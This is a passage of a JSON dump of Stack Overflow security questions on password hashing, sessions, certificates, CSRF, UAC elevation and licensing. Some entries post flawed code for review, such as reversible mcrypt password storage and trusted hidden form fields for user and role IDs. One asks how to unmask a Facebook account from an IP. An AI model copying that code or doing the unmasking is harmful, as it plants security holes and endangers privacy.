</p>\n\n<p>Also in reading, it says that putting mysql_connect.php above root might not be THE most secure way to store the information as it is still basically just a .txt file and it can be retrieved easily(like downloading it).  I am looking for a balance between secure and also do-able (for a beginner like myself).  The mysql database I am trying to protect will not have any personal information and I plan on using a dedicated server (with no other information on it).\nCan any one help me to solve this issue?  </p>\n"},{"tags":["security",".net-3.5","encryption","cryptography","passwords"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":740,"score":1,"question_id":3098829,"title":".NET 3.5 - Hashing a password using System.Cryptography","body":"<p>I am a bit of a newbie around Security nitty gritties and especially around Cryptography.</p>\n\n<p>In the application we are building(ASP.net application built on .NET 3.5), we are currently using Databases to save our users authentication information (AD etc is not an option at this point).\nThe intention is to do a one way salted hash of the passwords using SHA256Managed on user creation and then validate the users using the same.\nIdeally, we do not want to use any third party dll's for the hashing algorithm unless absolutely necessary to avoid any unnecessary dependencies.</p>\n\n<p>Questions:-\n1. Is there a better option than doing a salted one way hash?\n2. Is SHA256 a reasonably reliable / secure option or should we be considering anything else?\n3. Is the SHA256Managed implementation in System.Cryptography good enough in terms of it speed etc or should we be considering 3rd party alternatives to it?</p>\n\n<p>Any pointers as to the approach / implementation will be helpful.</p>\n"},{"tags":["php","mysql","security","bcrypt"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":38,"score":-6,"question_id":12719965,"title":"php bcrypt implement","body":"<p>Sorry I am new to PHP and is inspired to its flexibility.\nI seen lots of places on the web talk about and the use of Bcrypt. Where can I learn more about this in how to implement this and set up the DB to store this info?\nI'm looking for some tutorial on how to set bcrypt up from start to finish while using salt.\nCan someone lead me in the right direction, please.</p>\n"},{"tags":[".net","security","passwords","hash"],"answer_count":9,"favorite_count":2,"up_vote_count":7,"down_vote_count":1,"view_count":2106,"score":6,"question_id":1841595,"title":"Secure Password Hashing","body":"<p>I need to store a hash of a single password in a .Net WinForms application.</p>\n\n<p>What's the most secure way to do this?</p>\n\n<p>In particular:</p>\n\n<ul>\n<li>Salt, HMAC, or both?</li>\n<li>How much salt?</li>\n<li>How many iterations?</li>\n<li>What encoding? (The password is plain ASCII)</li>\n</ul>\n\n<p>I assume that the algorithm should be either SHA512 or HMACSHA512.</p>\n"},{"tags":["php","security","session","session-variables"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12719096,"title":"Understanding session save path as no value and security","body":"<p>I only use sessions to store variables and was hoping to ensure that the session save path could not be tampered with by any of the users. So I went to check my phpinfo and found that the session save path was set to no value. Is this normal for users who only use sessions for variables? Do I have anything to worry about if the sessions save path is set to no value? </p>\n"},{"tags":["security","ssl","cryptography","bouncycastle","certificates"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1492,"score":1,"question_id":7984945,"title":"\"The credentials supplied to the package were not recognized\" error when authenticating as server with certificate generated using BouncyCastle","body":"<p>I'm trying to create a certificate using the BouncyCastle.Crypto dll, which is then used to authenticate a SslStream as the server in a Windows Service process, which runs under the Local System account.</p>\n\n<p>However when I get to the SslStream.AuthenticateAsServer(certificate) call, it throws a Win32 exception with the error message \"The credentials supplied to the package were not recognized\".</p>\n\n<p>There are several questions on here about this error message, but none of them seem to describe, or solve, my particular problem.  </p>\n\n<p>In the hope that someone may be able to offer some help, I include the code I am using to create and install the certificate:</p>\n\n<pre><code>// First create a certificate using the BouncyCastle classes\nBigInteger serialNumber = BigInteger.ProbablePrime(120, new Random());\nAsymmetricCipherKeyPair keyPair = GenerateKeyPair();\n\nX509V1CertificateGenerator generator = new X509V1CertificateGenerator();\ngenerator.SetSerialNumber(serialNumber);\ngenerator.SetIssuerDN(new X509Name(\"CN=My Issuer\"));\ngenerator.SetNotBefore(DateTime.Today);\ngenerator.SetNotAfter(DateTime.Today.AddYears(100));\ngenerator.SetSubjectDN(new X509Name(\"CN=My Issuer\"));\ngenerator.SetPublicKey(keyPair.Public);\ngenerator.SetSignatureAlgorithm(\"SHA1WITHRSA\");\n\nOrg.BouncyCastle.X509.X509Certificate cert = generator.Generate(\n    keyPair.Private, SecureRandom.GetInstance(\"SHA1PRNG\"));\n\n// Ok, now we have a BouncyCastle certificate, we need to convert it to the \n// System.Security.Cryptography class, by writing it out to disk and reloading\nX509Certificate2 dotNetCert;\n\nstring tempStorePassword = \"Password01\"; // In real life I'd use a random password\nFileInfo tempStoreFile = new FileInfo(Path.GetTempFileName());\n\ntry\n{\n    Pkcs12Store newStore = new Pkcs12Store();\n\n    X509CertificateEntry entry = new X509CertificateEntry(cert);\n\n    newStore.SetCertificateEntry(Environment.MachineName, entry);\n\n    newStore.SetKeyEntry(\n        Environment.MachineName,\n        new AsymmetricKeyEntry(keyPair.Private),\n        new [] { entry });\n\n    using (FileStream s = tempStoreFile.Create())\n    {\n        newStore.Save(s, \n            tempStorePassword.ToCharArray(), \n            new SecureRandom(new CryptoApiRandomGenerator()));\n    }\n\n    // Reload the certificate from disk\n    dotNetCert = new X509Certificate2(tempStoreFile.FullName, tempStorePassword);\n}\nfinally\n{\n    tempStoreFile.Delete();\n}\n\n// Now install it into the required certificate stores\nX509Store targetStore = new X509Store(StoreName.My, StoreLocation.LocalMachine);\ntargetStore.Open(OpenFlags.ReadWrite);\ntargetStore.Add(dotNetCert);\ntargetStore.Close();\n</code></pre>\n\n<p>Ok, now I have created and installed the certificate. I then configure my Windows Service to use this certificate by supplying it with the generated certificate's thumbprint. I then use the certificate like this:</p>\n\n<pre><code>// First load the certificate\nX509Certificate2 certificate = null;\n\nX509Store store = new X509Store(StoreName.My, StoreLocation.LocalMachine);\nstore.Open(OpenFlags.ReadOnly);\n\nforeach (X509Certificate2 certInStore in store.Certificates)\n{\n    if (certInStore.Thumbprint == \"...value not shown...\")\n    {\n        certificate = certInStore;\n        break;\n    }\n}\n\nSslStream sslStream = new SslStream(new NetworkStream(socket, false), false);\n\n// Now this line throws a Win32Exception \n// \"The credentials supplied to the package were not recognized\"\nsslStream.AuthenticateAsServer(certificate);\n</code></pre>\n\n<p>Does anyone have any idea what the problem could be here?</p>\n\n<p>I don't get the problem if I install a certificate created with 'makecert', but that isn't suitable for production certificates.</p>\n\n<p>I've also tried creating a separate x509v1 CA certificate and then x509v3 certificate for server authentication, but I get the same error, so I removed this in the example code for simplicity.</p>\n"},{"tags":["php","security","login"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12716119,"title":"PHP Login system -- am I doing it right?","body":"<p>I'm kind of new to this stuff, but this is my login authorization page.</p>\n\n<pre><code>function encrypt($password, $salt) {\n    return base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($salt), $password, MCRYPT_MODE_CBC, md5(md5($salt))));\n}\n\n$query = \"SELECT * FROM users WHERE LOWER(`username`) = :user\";\n$stmt = $dbh-&gt;prepare($query);\n$stmt-&gt;bindValue(':user', strtolower($_POST['username']));\n$stmt-&gt;execute();\n\nif ($stmt-&gt;rowCount() == 1) {\n    $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);\n    if (encrypt($_POST['password'], $row['salt']) == $row['password']) {\n        echo \"Logged in!\";\n    }\n}\n</code></pre>\n\n<p>In my database, I have columns <code>username</code>, <code>password</code>, and <code>salt</code>. The password column contains the encrypted password.</p>\n\n<p>Is my workflow correct here?</p>\n"},{"tags":["c#",".net","security","windows-7","uac"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12710775,"title":"Starting an Application as Administrator from another one","body":"<p>I'm a little lost here.</p>\n\n<p>I have an App, let's call it App1.</p>\n\n<p>App1 works fine. In some cases, App1 needs to execute another program, App2.</p>\n\n<p>The code is simple:</p>\n\n<pre><code>           /*call app2*/\n            ProcessStartInfo startInfo = new ProcessStartInfo(Convert.ToString(ConfigurationManager.AppSettings[\"pathActualizador\"]));\n\n            startInfo.UseShellExecute = false;\n\n            try\n            {\n                System.Diagnostics.Process.Start(startInfo);\n            }\n            catch (ArgumentException)\n            {\n                MessageBox.Show(\"Error en parrmetros enviados al Actualizador..\", Properties.Resources.txtTituloAplicacion, MessageBoxButtons.OK, MessageBoxIcon.Information);\n            }\n\n            /*close app1 and letting app2 do its work*/\n            Application.ExitThread();\n</code></pre>\n\n<p>In some cases, I've problem with the authorization for calling app2.\nApp1 is a simple system, app2 needs to create, move and delete some files and folders (that's why is giving me trouble)\nAt least, we solve it executing as an administrator de app2, by right click --> properties --> execute as administrator.</p>\n\n<p>I'm trying to solve this.\nI've read many posts, about creating a manifest file here in SO.\nSo, I created one.\nI added the new item from Application project --> add new item --> app.manifest</p>\n\n<p>And by the default created, only changed this</p>\n\n<pre><code>&lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" /&gt;\n</code></pre>\n\n<p>THIS MANIFEST is for App1.\nWe have both apps in like 100 computers, and we can't  change it one by one (most of them are in another country)\nBut we have an application to modify, sending some commands throw Internet, the app1.\nSo, I've read that if a process create another one, this new process will have the same ExecutionLevel that its parent. So, adding the manifest in App1, when it creates Process for App2, should execute as Administrator</p>\n\n<p>I'm right or not?</p>\n\n<p>By the other hand, I've added the manifest, compiled, and sent the .exe and .manifest to a client, run, and I still have the same problem: The app2 cannot access to folders to modify them, returning a problem of  privileges. </p>\n\n<p>Is there something wrong ? I've to create a manifest for the App2 instead? This is kinda difficult, also is difficult to configure windows for each machine..</p>\n\n<p>I've read that I can also do something like</p>\n\n<pre><code>startInfo.Verb = \"runas\";\n</code></pre>\n\n<p>but also read that in the future (said this in 2008) that this could be ignored, and the only way will be using manifest. So I want to avoid this option</p>\n\n<p>edit: Using Visual Studio 2010, .NET 3.5</p>\n\n<p>edit2: I've tried \"runas\", also not working. The user is no administrator, so has no rights of administrator</p>\n"},{"tags":["iphone","ios","xcode","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12712260,"title":"Storing authentication token on iOS","body":"<p>I am building an iOS application and the user authenticates with my web service. I don't want them to login every time the app launches (the token lasts a month). So I'd like to cache this on the device somewhere. </p>\n\n<p>What's the best way to do this, securely?</p>\n\n<p>Can I just rely on the app remaining suspended and keeping the token in 'memory'?</p>\n"},{"tags":["asp.net","security","sharepoint","authorization"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12422458,"title":"Building ASP.Net custom authorization against database without MVC","body":"<p>this is my first request, so dont be too hard. :)</p>\n\n<p>We are building an Sharepoint 2010 - Application, which consists of some Sharepoint Web Parts and many ASP.Net-Sites. Therefore we are limited to use ASP.Net without MVC. This decision is made and cant be refused.</p>\n\n<p>We are using Windows Authentification with Impersonation. The Users are stored in an application database. Along with the users there are roles which have rights to specific objects and specific actions. all these informations are stored in the custom database.</p>\n\n<p>The database has a data access layer (EF 4.0). Because Sharepoint is limited to .NET Framework 3.5, the business logic consists of a WCF Data Service which is using the DAL and business logic libary which accessing the WCF Data Service to grab the required information.</p>\n\n<p>The ASP.Net-Pages and Sharepoint Web Parts are directly accessing the business logic.</p>\n\n<p>What i now need is some kind of a Manager-Class which is checking the user against the database to authorize him to access the specific objects. I dont want to do it programmaticly. I want to use annotations to specify if a method from the business layer can be called or not. Furthermore i want to hide some things in the ASP.Net Sites without an programmaticly if-clause.</p>\n\n<p>Can someone give me a hint to achieve this? Is there a way do customize some part of the standard framework to realize it?</p>\n\n<p>The user and his roles and rights i want to store in a session. Is this a good way? the application is accessible only in local network.</p>\n"},{"tags":["asp.net",".net","security","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12699921,"title":"ASP.NET Creating User Files As Read-Only - How to change this behavior?","body":"<p>I'm hoping someone could help me address a file permissions issue.  I'm having a permissions problem with an ASP.NET Web Application.</p>\n\n<p>When I create a file it creates the file with the Read-Only attribute by default.  So if I attempt to modify or access the file later I get the following error: </p>\n\n<blockquote>\n  <p>System.UnauthorizedAccessException: Access to the path 'Actual Path is\n  here' is denied.</p>\n</blockquote>\n\n<p>I can remove the <code>Read-Only</code> attribute with <code>File.SetAttributes</code>, but this is an extra step.</p>\n"},{"tags":["python","security","session","cryptography","client-side"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":8040843,"title":"Security issues with Itsdangerous for session management?","body":"<p>The content of a signed cookie with Itsdangerous can be inspected but not altered. \nAre there any known security issues or considerations when using <a href=\"http://packages.python.org/itsdangerous/\" rel=\"nofollow\">Itsdangerous</a> for client side session management? </p>\n\n<p>The session in question will not store any passwords, but obviously some information to identify the user, such as </p>\n\n<ul>\n<li>User ID</li>\n<li>URL to avatar</li>\n<li>User role(s)</li>\n</ul>\n"},{"tags":["wordpress","security","hacking"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12712951,"title":"Is there a way to stop Wordpress attempted hackers?","body":"<p>I have a wordpress installation that keeps locking out an attempted hack on the login page. My security plugin locks out the user and logs the IP. However, it's a dynamic IP and the hacker keeps trying. Can I do anything with the hacker's IP? I've added more security measures, but wonder what the best way is to deal with this?</p>\n"},{"tags":["security","browser","web-security","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12703838,"title":"Does disabling third party cookies protect a client against cross site request forgery attacks?","body":"<p>Say that example.org uses cookies to authenticate users and it did not implement cross site request forgery protection. Is an example.org user that disabled third party cookies secured against CSRF attack (assuming that all sensitive requests to example.org require valid authentication cookie to be present)?  If this is not the case, can you give examples illustrating how evil.com can perform sensitive operations in a name of the example.org user?</p>\n"},{"tags":["php","security","session","cookies"],"answer_count":5,"favorite_count":7,"up_vote_count":11,"down_vote_count":0,"view_count":5913,"score":11,"question_id":5435068,"title":"Creating a secure login using sessions and cookies in PHP","body":"<p>I am making a login script that I would like to be as secure as possible. Problem is, security seems to be a never ending battle. So essentially, I am looking for suggestions and improvements to my ideas.</p>\n\n<p>What I have is a login based solely on sessions. Anytime the session information changes, <code>session_regenerate_id()</code> is called to avoid obvious hijacking attempts.</p>\n\n<p>When the session is not set, I check a cookie for valid login, and on success, I update the session.</p>\n\n<p>I attempt to secure the cookie by adding a hash value along with a piece of unique user information (like username or id). This hash is comprised of various information, including the username/id, undecipherable password hash, part of the IP address, etc. By extracting the username/id from the cookie, I can make a new hash from the valid user information and compare that with the hash in the cookie. My hopes here are to prevent fake cookies and cookie hijacking (unless they also spoof the IP address).</p>\n\n<p><strong>EDIT</strong> Assume that the login itself will be done via HTTPS/SSL, so the transfer is (reasonably) secure.</p>\n\n<p>Am I on the right track? What else can be done to secure my login?</p>\n\n<p>Thanks for the help!</p>\n"},{"tags":["jquery","web-services","security"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12648714,"title":"Web API Security-How to protect student ID when you have to send it via http","body":"<p>I have a WebAPI and I need to send an unique key that identifies the student id. Since I am using an ajax call, I have to send that unique student id to the service to get that student's records. This is visible to the end user via view source or developer tools in some way (either a hidden html field or the url post or get parameter). \nHow can I prevent a student from view-sourcing my scheme and changing the id to another student and thus accessing someone else's data? Or closely related looking at the history and finding out the last student's id and accessing their history?</p>\n"},{"tags":["ios","security","pdf","permissions","cgpdfdocument"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":12709912,"title":"CGPDFDocument and the trailer/encrypt dictionary","body":"<p>I am trying to get access to the /Encrypt dictionary in the Trailer to check permissions on a PDF. CGPDFDocument only gives access to the Info and Root (top level) dictionaries it seems.</p>\n\n<p><strong>CGPDFDocumentGetCatalog</strong>\nCGPDFDocumentGetNumberOfPages\nCGPDFDocumentGetPage\nCGPDFDocumentGetVersion\n<strong>CGPDFDocumentGetInfo</strong>\nCGPDFDocumentGetID</p>\n\n<p>Any ideas on how to get to the file permissions beyond Printing and Copying ?</p>\n\n<p>CGPDFDocumentAllowsCopying\nCGPDFDocumentAllowsPrinting</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":152,"score":1,"question_id":2887787,"title":"File System and security (PHP)","body":"<p>Consider a simple file upload system written in php. User has access only in admin panel. \n(Not FTP). He may change folder option from 707 to 755 for security issue.\nHow can do this? Can we do this from upload script ? If yes is this a secure application?</p>\n"},{"tags":["php","security","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12707589,"title":"how to hide the actual download folder location","body":"<p>I have a question in my mind that how <code>mod_rewrite</code> increases the security.</p>\n\n<p>I have a my php file which shows a .pdf file online like <code>www.exaple.com?id=234</code> and it makes a query to database and get the actual folder location.</p>\n\n<p>the actual folder location is <code>uploads/</code> and i am using something like <a href=\"http://stackoverflow.com/questions/10997516/how-to-hide-the-actual-download-folder-location.\">how to hide the actual folder location</a></p>\n\n<p>Now i want to use <code>google docs</code> </p>\n\n<pre><code> echo \"&lt;iframe src=\\\"http://docs.google.com/gview?url=\".root.\"uploads/myfile.pdf\".\"&amp;embedded=true\\\" style=\\\"width:100%; height:100%;\\\" frameborder=\\\"0\\\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>but i don't want to show the upload directory <code>uploads/</code> in this url.So i use <code>module_rewrite</code> to change the directory name to <code>myfiles/</code> .</p>\n\n<p>The question is that when user changes the directory to <code>www.example.com/myfiles/hacking.php</code> than it will also rewrite to <code>uploads/hacking.php</code>.</p>\n\n<p>I am allowing user to upload files.although i am using blacklist but we assume that security holes may present</p>\n"},{"tags":["linux","security","cloud-hosting","sysadmin","configuration-management"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12700877,"title":"What are Secure Server Configurations for web apps?","body":"<p>Developer attempting to be a sysadmin for a cloud server.    </p>\n\n<p>On a Linux server (LAMP stack), what steps need to be taken at a MINIMUM to configure a secure server?  Should I remove the root user?  Should a different port number be used for http, etc.?  What else?  </p>\n\n<p>Looking for the sysadmin version of <a href=\"http://stackoverflow.com/questions/72394/what-should-a-developer-know-before-building-a-public-web-site\">What should a developer know before building a public web site</a></p>\n"},{"tags":["c++","windows","security","ntfs","filter-driver"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12692755,"title":"Can't access reparse point directory of mounted filter driver from user account in windows xp x64 prof","body":"<p>I created a \"special file system\" for a very special security application. </p>\n\n<p>I create a reparse point using an empty directory. Behind this reparse point is a filter driver, which handels the communication between NTFS and a usermode program, which is doing some encryption/decryption and control work (a mixture between FUSE, TrueCrypt, RamDisc,...). The whole thing is native in C/C++ and works fine unter Win7 x64.</p>\n\n<p>Now I have the nice task to make it work for windwos xp x64 professional. When the whole application is running with admin rights it works fine, but when I switch to user account, I can't access the mounted directory.</p>\n\n<p>The mounter and the \"special file system\" (lets name it sfs) are system services and an other app have to run under user account (COM relevant), the mount operation is successfull (when I switch to admin account after mount operation I can access the directory), the other parts of the application works fine too, but the only thing I can't manage is to get access to this very directory.</p>\n\n<p>I gave the \"everyone\" and the users group and the specific user all permissions to the driver, the library(link between driver and sfs), the mounter and the special file system and did a lot in the registry too. I also gave this permissions to the mounted dir (all rigths, owner,...) but nothing works.</p>\n\n<p>The debug outprint shows, that the request for the directory or the files inside never comes to to \"sfs\". It seems, that the IO-Manager never sends someting to this addres. An other problem is, that I can't manage to get all the debug outprints from the OS (boot in local debug mode and use DebugView.exe from SysInternals), but thats another story.</p>\n\n<p>What did I miss? What is the difference between the security system of XP and Win7? Are there any basic restrictions in XP which I don't know?</p>\n\n<p>Please ask if you need snippets of the code.</p>\n\n<p>Any advise or idea is welcome!</p>\n"},{"tags":["php","security","password-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":82,"score":-1,"question_id":12706061,"title":"How to password protect pdf in PHP","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12700974/how-to-password-protect-an-uploaded-pdf-in-php\">How to password protect an uploaded pdf in PHP</a>  </p>\n</blockquote>\n\n\n\n<p>I have a web app where users can upload pdf documents. Is there a php library that I can use to password protect the pdf file? I need the library to preserve all aspects of the original pdf (i.e. size, fonts, resolution, etc).</p>\n"},{"tags":["c#",".net","security"],"answer_count":5,"favorite_count":3,"up_vote_count":9,"down_vote_count":0,"view_count":590,"score":9,"question_id":2373904,"title":"Any coding security issues specific to C#?","body":"<p>In C++ world there is a variety of ways to make an exploitable vulnerability: buffer overflow, unsafe sting handling, various arithmetic tricks, printf issues, strings not ending with '\\0' and many more. Despite most of these problems were solved in java, there are some things to talk about.\nBut is there any list of typical C#-specific coding vulnerabilities? (and not related to .NET platform itself)</p>\n"},{"tags":["php","security","magento"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12685973,"title":"Magento security issue","body":"<p>I am using a magento for my site. I am facing the some problem with it. After some time a code gets added in the header of the index files. and my site stops working. When I remove that error like (encrypted) code again site works well.</p>\n\n<p>Is there any way to avoid such code injections? I searched on the net but have not got the proper solution.</p>\n"},{"tags":["facebook","security","fake","fakeweb"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12704946,"title":"Facebook Fake Account : Reveal identity","body":"<p>I have this spammer on my facebook account and is really pestering me.I am pretty much sure she/he is from the same college as mine, how can i track and identify , to whom does this account belong to ?</p>\n\n<p>I followed <a href=\"http://www.techampere.com/how_to_track_a_fake_facebook_account/\" rel=\"nofollow\">this link</a> to get the IP of the \"fake account\"\nBut now how can i get the identity of the IP</p>\n\n<p>Say user A has created fake account B , so how can i get the identity of A ?\nHow can i prove that account B belongs to user A ?</p>\n\n<p>Please help , i know this is not a programming language question but i really need this\nThank you.</p>\n"},{"tags":["java","security"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1638,"score":1,"question_id":4696141,"title":"How can I establish trust in a X.509 certificate issued by an intermediary?","body":"<p>I have an XML document that is digitally signed. I use the XML Digital Signature API to verify the signature. But this document is a SAML 2.0 Assertion that will be used for single sign-on into our web application. As such I need to establish trust in the X.509 certificate used to sign the XML document.</p>\n\n<p>The code I am using to try and establish this trust is:</p>\n\n<pre><code>String filename = System.getProperty(\"java.home\") + \"/lib/security/cacerts\".replace('/', File.separatorChar);\nFileInputStream is = new FileInputStream(filename);\nKeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());\nString password = \"changeit\";\nkeystore.load(is, password.toCharArray());\n\nPKIXParameters params = new PKIXParameters(keystore);\nparams.setRevocationEnabled(false);\n\nCertificateFactory certFactory = CertificateFactory.getInstance(\"X.509\");\nCertPath certPath = certFactory.generateCertPath(Arrays.asList(signatureCertificate));\n\nCertPathValidator certPathValidator = CertPathValidator.getInstance(CertPathValidator.getDefaultType());\nCertPathValidatorResult result = certPathValidator.validate(certPath, params);\n\nPKIXCertPathValidatorResult pkixResult = (PKIXCertPathValidatorResult) result;\nTrustAnchor ta = pkixResult.getTrustAnchor();\nX509Certificate cert = ta.getTrustedCert();\n</code></pre>\n\n<p>When run the call to <code>certPathValidator.validate()</code> throws a <code>CertPathValidatorException</code> with the message <code>Path does not chain with any of the trust anchors</code>.</p>\n\n<p>Examining the certificate, it says it has been issued by <code>OU=www.verisign.com/CPS Incorp.by Ref. LIABILITY LTD.(c)97 VeriSign,OU=VeriSign International Server CA - Class 3,OU=VeriSign\\, Inc.,O=VeriSign Trust Network</code>.\nThis is not one of the trust anchors in the JDK's cacerts key store.</p>\n\n<p>However, using IE to inspect a similar certificate's trust chain I see that <code>www.verisign.com/CPS Incorp.</code>'s was issued by <code>VeriSign Class 3 Public Primary CA</code>, which does appear to be one of the trust anchors in the JDK's cacerts key store.</p>\n\n<p>My question: how can I get Java to validate this certificate?</p>\n"},{"tags":["php","security","hash","passwords","pbkdf2"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12696314,"title":"what are appropriate PBKDF2 settings?","body":"<p>I have a few questions about what are appropriate PBKDF2 settings. I googled for answers and came up mostly empty handed. </p>\n\n<p>Basically, I would like to know what are appropriate values for the input pbkdf2.php (found <a href=\"https://defuse.ca/php-pbkdf2.htm\" rel=\"nofollow\">here</a>) considering the state of technology in 2012. What will give me a reasonable expectation that the passwords I encode will not be hackable by non governmental entities for the next few years?</p>\n\n<p>Here is what I am considering:</p>\n\n<pre><code>define(\"PBKDF2_HASH_ALGORITHM\", \"sha512\");\ndefine(\"PBKDF2_ITERATIONS\", 20000);\ndefine(\"PBKDF2_SALT_BYTES\", 512);\ndefine(\"PBKDF2_HASH_BYTES\", 512);\n</code></pre>\n\n<p>I understand that there are many other things that come into play to create good security. Here is a synopsis of other security measures I am using:</p>\n\n<ul>\n<li>12 digit password with at least 2 numbers, 2 letters, and two symbols</li>\n<li>required password changes every 6 months</li>\n<li>php mysqli prepared statements for all database access</li>\n<li>tokens on all my forms</li>\n<li>5 second delay for incorrect logins,</li>\n<li>blacklist after 10 incorrect logins from the same IP</li>\n<li>incorrect logins and blacklist trigger the same response</li>\n<li>HTTPS</li>\n<li>I am using session and I change the session identifier every 10 pages\nand on sensitive pages, every time the page is accessed.</li>\n</ul>\n\n<p>Am I missing anything?</p>\n"},{"tags":["ruby-on-rails","security","hidden-field"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12702828,"title":"ROR3 : hidden_field security","body":"<p><strong>i've this in _form.html.erb:</strong></p>\n\n<pre><code>        &lt;%if current_user.role_id == 1 %&gt;\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :subscriber %&gt;\n                &lt;%= f.collection_select(:user_id, User.all,:id,:name,{:include_blank=&gt;false}, :class =&gt; 'styled')  %&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :group %&gt;\n                &lt;%= f.grouped_collection_select(:group_id, User.all,:support_agent_groups,:name,:id,:name, {:prompt =&gt; \"-- Select a group --\"}, :class =&gt; 'styled')  %&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :role %&gt;\n                &lt;%= f.collection_select(:role_id, Role.all,:id,:name,{:include_blank=&gt;false}, {:class =&gt; 'styled'})  %&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :subscription %&gt;\n                &lt;%= f.collection_select(:subscription_id, Subscription.all,:id,:name, {:prompt =&gt; \"-- Select a subscription --\"}, {:class=&gt;'styled'})    %&gt;\n            &lt;/div&gt;              \n\n        &lt;% elsif  current_user.role_id == 6  &amp;&amp; @user.role_id != 6 %&gt;\n\n            &lt;%= f.hidden_field :user_id, :value =&gt; current_user.id %&gt;\n\n            &lt;%= f.hidden_field :subscription_id, :value =&gt; current_user.subscription_id %&gt;\n\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :group %&gt;\n                &lt;%= f.collection_select(:group_id, SupportAgentGroup.where(:user_id =&gt; current_user.id),:id,:name, {:prompt =&gt; \"-- Select a group --\"}, :class =&gt; 'styled')  %&gt;\n            &lt;/div&gt;\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :role %&gt;\n                &lt;%= f.collection_select(:role_id, Role.where('id &lt;&gt; ?', 1).where('id &lt;&gt; ?', 6),:id,:name,{:include_blank=&gt;false}, {:class =&gt; 'styled'})  %&gt;\n            &lt;/div&gt;\n\n        &lt;% elsif  current_user.role_id == 6 %&gt;\n\n            &lt;%= f.hidden_field :user_id, :value =&gt; current_user.id %&gt;\n            &lt;%= f.hidden_field :role_id, :value =&gt; current_user.role_id %&gt;\n            &lt;%= f.hidden_field :subscription_id, :value =&gt; current_user.subscription_id %&gt;\n\n\n            &lt;div class=\"combo_box\"&gt;\n                &lt;%= f.label :group %&gt;\n                &lt;%= f.collection_select(:group_id, SupportAgentGroup.where(:user_id =&gt; current_user.id),:id,:name, {:prompt =&gt; \"-- Select a group --\"}, :class =&gt; 'styled')  %&gt;\n            &lt;/div&gt;\n\n        &lt;% else %&gt;\n\n            &lt;%= f.hidden_field :user_id, :value =&gt; current_user.user.id %&gt;\n            &lt;%= f.hidden_field :group_id, :value =&gt; current_user.group_id %&gt;\n            &lt;%= f.hidden_field :subscription_id, :value =&gt; current_user.user.subscription_id %&gt;\n            &lt;%= f.hidden_field :role_id, :value =&gt; current_user.role_id %&gt;\n\n        &lt;% end %&gt; \n</code></pre>\n\n<p>I can view every hidden filed with values on inspect element with firebug option in browser as </p>\n\n<pre><code>&lt;input id=\"user_user_id\" type=\"hidden\" value=\"2\" name=\"user[user_id]\" /&gt;\n</code></pre>\n\n<p>where I can change value <code>2</code> to <code>100/200/....</code></p>\n\n<p>and on submint the new value <code>100/200/...</code> is posted for saving to db and was saved in db.</p>\n\n<p>Am i need to check all the conditions in view and also in controller to find the suitable default values.. or any option to use the hidden_filed to fix this security issue.</p>\n\n<p>Thanks for any help...</p>\n"},{"tags":["windows","security","datetime","licensing","offline"],"answer_count":13,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":1624,"score":9,"question_id":3404045,"title":"How to protect software from system date-time changes?","body":"<p>I would like to add licensing system to application. For example: user buys license for 1 month and after that program expires (Kinda Anti-Virus style?).</p>\n\n<p>Problem is that application is supposed to run in systems which may or <strong>may not be connected to internet</strong>, 